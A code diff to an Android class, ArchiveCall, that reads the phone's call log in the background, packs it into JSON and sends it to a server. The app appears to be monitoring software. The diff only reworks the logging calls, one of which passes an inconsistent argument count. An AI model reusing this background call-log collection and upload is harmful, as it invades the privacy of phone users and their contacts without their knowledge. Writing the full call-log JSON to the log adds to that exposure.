@@ -12,12 +12,14 @@ import android.util.Log;
 import com.inet.android.convertdate.ConvertDate;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
 
 public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	Context mContext;
 	RequestDataBaseHelper db;
 	private int iType = 0;
 	ConvertDate date;
+	private String LOG_TAG = "ArchiveCall";
 
 	private String getDuration(long milliseconds) {
 		int seconds = (int) (milliseconds / 1000) % 60; // 280
@@ -31,7 +33,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	private String readCallLogs() {
 
 		// Вставляем контакты
-		Log.d("Insert: ", "Inserting ..");
+		Logging.doLog(LOG_TAG ,"Insert: ", "Inserting ..");
 		// формируем JSONobj
 		JSONObject AllCallJson = new JSONObject();
 		date = new ConvertDate();
@@ -44,10 +46,10 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 
 		if (callLogCursor != null) {
 			// Проходим в цикле, пока не дойдём до последней записи
-			Log.d("Insert: ", "callogCursor != 0 ..");
+			Logging.doLog(LOG_TAG, "callogCursor != 0 ..");
 
 			while (callLogCursor.moveToNext()) {
-				Log.d("Insert: ", "callogCursor moveToNext ..");
+				Logging.doLog(LOG_TAG, "callogCursor moveToNext ..");
 
 				// Идентификатор. В нашем примере не нужен
 				// String id = callLogCursor.getString(callLogCursor
@@ -109,7 +111,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 			if (AllCallJson != null) {
 				DataRequest dr = new DataRequest(mContext);
 				dr.sendRequest(AllCallJson.toString());
-				Log.d("JsonCall", AllCallJson.toString());
+				Logging.doLog(LOG_TAG, AllCallJson.toString());
 			}
 		}
 		return null;
@@ -118,9 +120,8 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	@Override
 	protected Void doInBackground(Context... params) {
 		// TODO Автоматически созданная заглушка метода
-		Log.d("doInBack", "doIn");
+		Logging.doLog(LOG_TAG, "doIn");
 		this.mContext = params[0];
-		Log.d("doInBack", mContext.toString());
 		readCallLogs();
 		return null;
 	}
